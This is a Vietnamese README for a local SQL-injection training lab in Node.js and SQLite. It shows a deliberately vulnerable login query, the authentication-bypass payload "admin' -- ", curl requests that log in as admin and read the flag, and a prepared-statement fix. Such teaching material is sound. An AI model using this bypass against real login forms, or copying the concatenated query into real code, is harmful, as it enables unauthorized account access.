# Lab: SQL Injection trong chức năng đăng nhập

## 1. Giới thiệu

Đây là một web lab/CTF nhỏ mô phỏng lỗi **SQL Injection** trong chức năng đăng nhập. Ứng dụng có tài khoản người dùng thông thường và một khu vực quản trị chứa flag.

Mục tiêu của lab:

- Chạy ứng dụng Node.js local.
- Hiểu luồng Browser → Express → SQLite.
- Khai thác lỗi SQL Injection tại `/login` để đăng nhập với quyền admin.
- Truy cập `/admin` và lấy flag.
- Hiểu cách khắc phục bằng prepared statement.

> Chỉ chạy lab trong môi trường local hoặc môi trường được cho phép. Lỗ hổng được tạo có chủ đích cho mục đích học tập.

## 2. Công nghệ

- Node.js 22 trở lên
- Express
- SQLite qua module `node:sqlite`
- HTML, CSS và JavaScript thuần
- Session lưu trong bộ nhớ server

## 3. Cấu trúc project

```text
.
├── server.js              # Web server, database, login và phân quyền
├── database.db            # SQLite database
├── package.json
├── public/
│   ├── index.html         # Trang đăng nhập
│   ├── app.js             # Gửi request đăng nhập
│   ├── style.css
│   └── dashboard.css
└── private/
    ├── user.html          # Trang user thường
    └── admin.html         # Trang admin chứa flag
```

## 4. Cài đặt và chạy

```bash
npm install
node server.js
```

Mở trình duyệt tại:

```text
http://127.0.0.1:3000
```

Server lắng nghe trên `127.0.0.1:3000`.

## 5. Tài khoản mẫu

Server tự tạo các tài khoản sau nếu chúng chưa tồn tại:

| Username | Password | Role |
|---|---|---|
| `alice` | `alice123` | `user` |
| `admin` | `admin123` | `admin` |

Đăng nhập bằng `alice` sẽ chuyển tới `/user`; tài khoản admin sẽ chuyển tới `/admin`.

## 6. Các endpoint

| Method | Endpoint | Mô tả |
|---|---|---|
| `POST` | `/register` | Tạo tài khoản user mới |
| `POST` | `/login` | Đăng nhập và tạo session |
| `GET` | `/user` | Trang dành cho user đã đăng nhập |
| `GET` | `/admin` | Trang chỉ dành cho admin |
| `POST` | `/logout` | Xóa session hiện tại |

Cookie `sid` chứa mã session. Middleware `requireLogin` kiểm tra đăng nhập, còn `requireAdmin` kiểm tra `role === "admin"`.

## 7. Phân tích lỗ hổng

Trong `server.js`, dữ liệu người dùng được nối trực tiếp vào câu SQL:

```js
const query = `
    SELECT id, username, role
    FROM users
    WHERE username = '${username}'
        AND password = '${password}'
`;
```

Vì input không được parameterize, người dùng có thể chèn cú pháp SQL để thay đổi điều kiện `WHERE` và bỏ qua việc kiểm tra password.

## 8. Khai thác để lấy flag

Tại form đăng nhập, nhập:

```text
Username: admin' -- 
Password: bất kỳ giá trị nào
```

Truy vấn sau khi chèn payload tương đương:

```sql
SELECT id, username, role
FROM users
WHERE username = 'admin' -- '
    AND password = 'bất kỳ giá trị nào'
```

`--` biến phần kiểm tra password còn lại thành comment. Server tìm thấy user `admin`, tạo session với role `admin` và chuyển tới `/admin`.

Flag:

```text
FLAG{SQL_Injection_to_bypass}
```

Có thể gửi request trực tiếp bằng `curl`:

```bash
curl -i -c cookies.txt \\
  -H 'Content-Type: application/json' \\
  -d '{"username":"admin\u0027 -- ","password":"x"}' \\
  http://127.0.0.1:3000/login
```

Sau đó dùng cookie để truy cập trang admin:

```bash
curl -i -b cookies.txt http://127.0.0.1:3000/admin
```

## 9. Cách khắc phục

Không nối chuỗi input trực tiếp vào SQL. Sử dụng prepared statement:

```js
const query = db.prepare(`
    SELECT id, username, role
    FROM users
    WHERE username = ? AND password = ?
`);

const user = query.get(username, password);
```

Trong ứng dụng thực tế cần hash password bằng Argon2 hoặc bcrypt thay vì lưu plain text. Ngoài ra nên bổ sung rate limiting, logging, quản lý session phù hợp và cookie `Secure` khi chạy qua HTTPS.

## 10. Kết quả mong đợi

Hoàn thành lab khi có thể:

1. Chạy ứng dụng tại `http://127.0.0.1:3000`.
2. Đăng nhập user bình thường và truy cập `/user`.
3. Dùng SQL Injection để bypass password của tài khoản admin.
4. Truy cập `/admin` và đọc flag.
5. Giải thích nguyên nhân và cách phòng chống lỗi.
